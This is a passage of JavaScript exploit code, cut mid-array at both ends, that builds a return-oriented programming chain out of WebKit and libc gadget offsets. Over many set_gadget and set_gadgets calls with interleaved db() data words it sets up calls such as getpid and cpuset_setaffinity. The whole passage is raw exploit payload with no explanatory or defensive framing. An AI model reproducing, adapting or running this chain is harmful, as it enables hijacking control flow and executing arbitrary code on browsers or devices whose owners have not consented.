libc_base+793877, 
ropchain+312424, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+312440, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+312552, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+312536, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
getpid_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+313880, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
cpuset_setaffinity_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+315208, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+315280, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+315344, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([2248, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+315488, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+392448, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+315624, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+315640, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+315608, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+315752, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+315720, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
libc_base+793877, 
ropchain+315880, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+315896, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+315864, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+316000, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+316048, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+316016, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+316160, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+316152, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+316176, 
ropchain+316616, 
libc_base+50775, 
libc_base+793877, 
ropchain+316216, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([179, 0]); 
set_gadget(libc_base+788575,); 
db([179, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+316368, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+316384, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+316352, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+316480, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+316496, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+316608, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+316592, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967292, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+316712, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+793877, 
ropchain+316768, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+316816, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967292, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+316920, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+316936, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+317088, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+317120, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+317104, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+317072, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+317192, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+317208, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+317304, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+317288, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+317384, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([16, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+317536, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+317552, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+317520, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+317720, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+317736, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+317704, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+317840, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+317888, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+317856, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+318000, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+317992, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+318016, 
ropchain+318032, 
libc_base+811575, 
ropchain+318048, 
libc_base+811575, 
ropchain+319008, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([2, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([28, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+318256, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+393776, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+318328, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967292, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+318432, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+318448, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+318600, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+318632, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+318616, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+318584, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+318728, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+318712, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+318816, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+318872, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967292, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+318952, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+316776, 
libc_base+759626, 
libc_base+793877, 
ropchain+319064, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967278, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+319168, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+319280, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+295552, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+319352, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+319456, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+319472, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+319616, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+319584, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+319600, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+319696, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967278, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+319800, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+319816, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+270800, 
libc_base+793877, 
ropchain+319976, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+319944, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+319928, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+320032, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+320136, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+320168, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+320152, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+320328, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+320296, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+320280, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+320432, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+320416, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+397880, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+320584, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160240, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+320656, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+320760, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+320776, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+320872, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+320856, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+788575, 
ropchain+398288, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+321024, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+321040, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+321184, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+321152, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+321168, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+321264, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([29080032, 0]); 
set_gadget(libc_base+788575,); 
db([29080032, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+321416, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+321432, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+321400, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+321520, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+321664, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+321680, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+321776, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+321760, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+788575, 
ropchain+398752, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+321912, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+321928, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+322072, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+322040, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+322056, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+322152, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([448, 0]); 
set_gadget(libc_base+788575,); 
db([448, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+322304, 
webkit_base+7438103, 
